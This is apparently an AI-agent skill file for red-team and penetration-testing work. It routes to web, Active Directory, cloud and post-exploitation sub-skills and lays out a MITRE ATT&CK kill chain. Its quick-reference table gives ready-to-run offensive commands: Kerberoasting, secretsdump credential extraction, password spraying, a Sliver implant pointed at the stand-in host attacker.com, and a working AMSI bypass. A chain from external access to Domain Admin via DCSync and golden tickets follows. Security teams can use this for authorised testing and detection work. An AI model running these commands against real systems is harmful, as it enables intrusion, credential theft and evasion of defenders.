---
name: red-team
description: <!-- Copyright (c) 2026 defconxt. All rights reserved. -->
---

<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
---
name: red-team
description: >-
  Red team operations and penetration testing. Routes to sub-skills by domain:
  web application attacks (red-team/web/), Active Directory exploitation
  (red-team/active-directory/), cloud attacks (red-team/cloud/), and
  post-exploitation/C2 (red-team/post-exploitation/). Use when asked about
  offensive security, exploitation, attack paths, CTF challenges, or
  red team engagements.
domain: cybersecurity
subdomain: red-teaming
tags:
  - penetration-testing
  - offensive-security
  - red-team
  - exploitation
  - mitre-attack
  - kill-chain
  - ctf
version: "1.1"
author: defconxt
license: AGPL-3.0
compatibility: Designed for Claude Code, GitHub Copilot, OpenAI Codex, Cursor, Gemini CLI, and any agentskills.io-compatible agent.
metadata:
  mitre-attack: ["T1190", "T1566", "T1059", "T1003", "T1021", "T1078"]
  sub-skills:
    - red-team/web
    - red-team/active-directory
    - red-team/cloud
    - red-team/post-exploitation
---

# Red Team Operations

## When to Use

- Penetration testing methodology and engagement planning
- Offensive security tool selection and attack path mapping
- CTF challenges and vulnerability research
- Sub-skills load by domain — see routing table below

| Domain | Sub-skill | Triggers |
|--------|-----------|----------|
| Web | `red-team/web/` | SQLi, XSS, SSTI, SSRF, JWT, OAuth, API abuse |
| Active Directory | `red-team/active-directory/` | Kerberos, ADCS, NTLM, BloodHound, Windows domain |
| Cloud | `red-team/cloud/` | AWS, Azure, GCP, IAM, metadata, S3 |
| Post-Exploitation | `red-team/post-exploitation/` | Linux privesc, C2, Sliver, evasion, pivoting |

## Engagement Mindset

**Think like the defender to beat them:** Know what each technique logs (Event IDs, Sysmon rules, EDR telemetry) before executing. Slow and deliberate beats fast and noisy.

**Assume monitoring:** Treat every command as if it is logged. Default to LOLBins, in-memory execution, and legitimate admin tools before dropping custom binaries.

**Objective-driven:** Define the crown jewel before starting. Every action asks "does this get me closer to the objective?"

## Kill Chain Overview (MITRE ATT&CK)

```
Recon         — OSINT, DNS, Shodan, certificate transparency
Initial Access — phishing (T1566), exploit public-facing app (T1190)
Execution     — PowerShell (T1059.001), WMI (T1047)
Persistence   — registry run keys, scheduled tasks, WMI subscriptions
Privilege Esc — token impersonation, kernel exploits, sudo abuse
Defense Evasion — AMSI bypass, LOLBins, process injection, ETW patching
Credential Access — LSASS dump, Kerberoast, AS-REP, DCSync
Discovery     — BloodHound, SharpHound, ADRecon
Lateral Move  — PtH, PtT, WMI, PSRemoting, Sliver pivots
C2            — mTLS (Sliver), HTTPS beacons, DNS C2
Exfiltration  — HTTPS, DNS tunneling, Egress-Assess
```

## Standard Toolkit

| Phase | Tool | Purpose |
|-------|------|---------|
| Recon | nmap, masscan | Port/service discovery |
| Web | Burp Suite, sqlmap, ffuf | Web application testing |
| AD | BloodHound, Rubeus, NetExec | AD enumeration and exploitation |
| Credentials | Impacket, pypykatz, Mimikatz | Credential extraction |
| C2 | Sliver, Metasploit | Command and control |
| Pivot | Chisel, Ligolo-ng | Tunneling and pivoting |
| Evasion | ThreatCheck, Invoke-Obfuscation | Detection bypass |

## Quick Reference

| Task | Command |
|------|---------|
| Nmap SYN scan | `nmap -sS -sV -sC -O --top-ports 1000 -T4 -oA output target` |
| BloodHound collect | `SharpHound.exe -c All --zipfilename bh.zip` |
| Kerberoast | `GetUserSPNs.py domain/user:pass -request -outputfile spns.txt` |
| Secretsdump | `secretsdump.py domain/user:pass@target` |
| Sliver generate | `generate --mtls attacker.com --os windows --save implant.exe` |
| Chisel pivot | server: `chisel server -p 8888 --reverse` |
| NetExec spray | `nxc smb targets.txt -u users.txt -p pass.txt --continue-on-success` |
| AMSI bypass | `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)` |

## Key Chain: External to Domain Admin

1. **Recon**: nmap top-1000 + BloodHound SharpHound → attack surface
2. **Initial access**: phishing (T1566) or exploit public app (T1190) → foothold
3. **Local privesc**: sudo, SUID, cron, PATH hijack → SYSTEM/root
4. **Credential access**: LSASS dump or Kerberoast → crackable hashes
5. **Lateral movement**: PtH/PtT or NetExec psexec → high-value hosts
6. **Domain escalation**: BloodHound path to DA → DCSync → all domain hashes
7. **Persistence**: golden ticket + C2 beacon
8. **Report**: ATT&CK Navigator annotated findings

## Detection Opportunities

Every technique in this skill generates detectable artifacts. Key detection surfaces:
- Sysmon Event ID 10 (ProcessAccess to lsass.exe) for credential dumping
- Event ID 4769 with RC4 encryption for Kerberoasting
- Event ID 4625 patterns for password spraying
- DNS query volume anomalies for C2 beaconing
- Named pipe creation for lateral movement tools

## Verification

- [ ] Correct sub-skill loaded for engagement type
- [ ] Engagement follows pipeline methodology
